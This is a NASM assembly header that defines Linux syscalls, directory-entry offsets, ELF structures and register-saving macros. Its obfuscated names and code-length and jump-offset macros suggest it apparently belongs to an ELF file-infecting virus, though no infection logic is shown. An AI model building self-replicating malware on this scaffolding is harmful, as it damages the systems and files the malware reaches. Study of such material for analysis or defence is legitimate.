; SYSCALL
%define     SYS_OPEN        2
%define     SYS_CLOSE       3
%define  SYS_LSEEK  8
%define  SYS_MMAP  9
%define  SYS_UNMAP  11
%define     SYS_EXIT        60
%define  SYS_FTRUNCATE 77
%define     SYS_GETDENTS    217

; OPEN
%define  O_RDONLY   0x0000
%define  O_WRONLY   0x0001
%define  O_RDWR    0x0002
%define  O_DIRECTORY   0q0200000

; DIRENT
%define  D_INO_OFF   0x00
%define  D_OFF_OFF   0x08
%define  D_RECLEN_OFF  0x10
%define  D_TYPE     0x12
%define  D_NAME     0x13
%define     D_REG_FILE          0x8

; MMAP
%define  PROT_EXEC  1
%define  PROT_READ  2
%define  PROT_WRITE  4
%define  MAP_SHARED  1

; LSEEK
%define  SEEK_SET   0x0
%define  SEEK_END   0x2

%define  FAM(x)    [(rbp - u2rzAAKL_size) + x]
%define  INF(x)    [(rbp - KpgTnnql_size) + x]


%define  CODE_LEN  (Vb8XvBo - _start)
%define  FINJMP_OFF  (S4umhz0C - _start)
%define  PAGE_SIZE  0x1000


struc u2rzAAKL
.vVSOBeEv             resq    1
.nCPWqsX          resq    1
.gEasjg                 resq    1
.Zx4R0U0:           resb    PAGE_SIZE
.WovBKGNR:        resd    1
.Dw7BNGMqP7:     resd    1
.WHyq9Id resq    1
.APPAAWeB49 resq 1
endstruc

struc KpgTnnql
.MfN3A   resq 1
.K1K5MwObY   resq 1
.APPAAWeB49   resq 1
.eA1Xqq    resb 1
.uzlFZZDvB  resq 1
.XGyY0 resq 1
.GP8J7 resq 1
.NuvpHW0Et  resq 1
.OYWhdd  resq 1 
.QMXCdEiSp  resq 1
.QfP6qV  resq 1
.zORr2QV   resb 1
.vHciMjzdfE   resq 1
.YCwBBJ  resq 1
.WQff0T4  resq 1
endstruc

; ELF structures
%define PT_LOAD  0x1
%define PT_NOTE  0x4
%define PF_X  0x1
%define PF_R  0x4
%define SHT_PROGBITS 0x1
%define SHT_STRTAB 0x3
%define SHT_NOTE 0x7
%define SHT_RELA 0x4
%define SHF_ALLOC 0x2
%define SHF_EXECINSTR 0x4

struc DhKUDH3
.F7qUFgPx:  resb 16
.TsKg0O1:  resw 1
.hYyrpPSxIV:  resw 1
.LCyPonaj:  resd 1
.FxChjYy:  resq 1
.swhPUiCf:  resq 1
.awj5eW:  resq 1
.ptmty7J:  resd 1
.eUbAbRE:  resw 1
.GSK3LsK3: resw 1
.yA0GiC:  resw 1
.AvxMK0cCJ: resw 1
.fUvnzTf:  resw 1
.vuTYQ65HMR: resw 1
endstruc

struc eysWeV
.mxHN6:  resd 1
.KqcOiRj3U:  resd 1
.SVomPCQ:  resq 1
.h1boz:  resq 1
.frDmKU10gH:  resq 1
.H2CSN:  resq 1
.crMm6:  resq 1
.hvVTAQuwwI:  resq 1
endstruc

struc uONbqnFOqh
.AHtar4vo:  resd 1
.F0xW2jn:  resd 1
.MZXGNsdtmd:  resq 1
.xYF0I:  resq 1
.nh3nBV:  resq 1
.GxbofXb6IU:  resq 1
.ztbIC:  resd 1
.QqRNni:  resd 1
.iAuRcOh resq 1
.BvO1PV  resq 1
endstruc

struc iecwMUg
.xGV6fBYsv  resq 1
.coGWj   resq 1
.ODHI1ALen  resq 1
endstruc

%macro PUSHA 0
push rax
push rbx
push rcx
push rdx
push rsi
push rdi
push r8
push r9
push r10
push r11
push r12
push r13
push r14
push r15
%endmacro

%macro POPA 0
pop r15
pop r14
pop r13
pop r12
pop r11
pop r10
pop r9
pop r8
pop rdi
pop rsi
pop rdx
pop rcx
pop rbx
pop rax
%endmacro 